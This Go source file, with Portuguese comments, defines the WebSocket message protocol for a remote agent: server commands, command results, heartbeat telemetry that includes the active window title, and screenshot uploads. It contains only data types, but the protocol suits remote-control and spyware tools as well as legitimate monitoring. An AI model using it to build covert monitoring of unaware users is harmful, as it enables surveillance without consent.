package connection

import "encoding/json"

// WebSocketMessage é o envelope padrão de todas as mensagens
type WebSocketMessage struct {
	Type      string          `json:"type"`
	Payload   json.RawMessage `json:"payload,omitempty"`
	RequestID string          `json:"request_id,omitempty"`
}

// ParsePayload deserializa o payload para uma struct específica
func (m *WebSocketMessage) ParsePayload(v interface{}) error {
	return json.Unmarshal(m.Payload, v)
}

// NewMessage cria uma nova mensagem WebSocket
func NewMessage(msgType string, payload interface{}) (WebSocketMessage, error) {
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return WebSocketMessage{}, err
	}

	return WebSocketMessage{
		Type:    msgType,
		Payload: payloadBytes,
	}, nil
}

// CommandPayload é o payload de um comando recebido do servidor
type CommandPayload struct {
	ID     string        `json:"id"`
	Type   string        `json:"type"`
	Params []interface{} `json:"params"`
}

// CommandResultPayload é o payload de resposta a um comando
type CommandResultPayload struct {
	CommandID string `json:"command_id"`
	HWID      string `json:"hwid"`
	Status    string `json:"status"`
	Output    string `json:"output"`
}

// HeartbeatPayload é o payload de telemetria
type HeartbeatPayload struct {
	HWID         string  `json:"hwid"`
	Hostname     string  `json:"hostname"`
	OSInfo       string  `json:"os_info"`
	IPLocal      string  `json:"ip_local"`
	CPULoad      float64 `json:"cpu_load"`
	RAMUsage     int64   `json:"ram_usage"`
	ActiveWindow string  `json:"active_window"`
}

// ScreenshotUploadPayload é o payload de upload de screenshot
type ScreenshotUploadPayload struct {
	HWID             string `json:"hwid"`
	TriggerCommandID string `json:"trigger_command_id"`
	ImageBase64      string `json:"image_base64"`
}

// Status constants
const (
	StatusSuccess = "SUCCESS"
	StatusError   = "ERROR"
)

// Message types
const (
	TypeHeartbeat        = "HEARTBEAT"
	TypeCommand          = "COMMAND"
	TypeCommandResult    = "COMMAND_RESULT"
	TypeScreenshotUpload = "SCREENSHOT_UPLOAD"
)
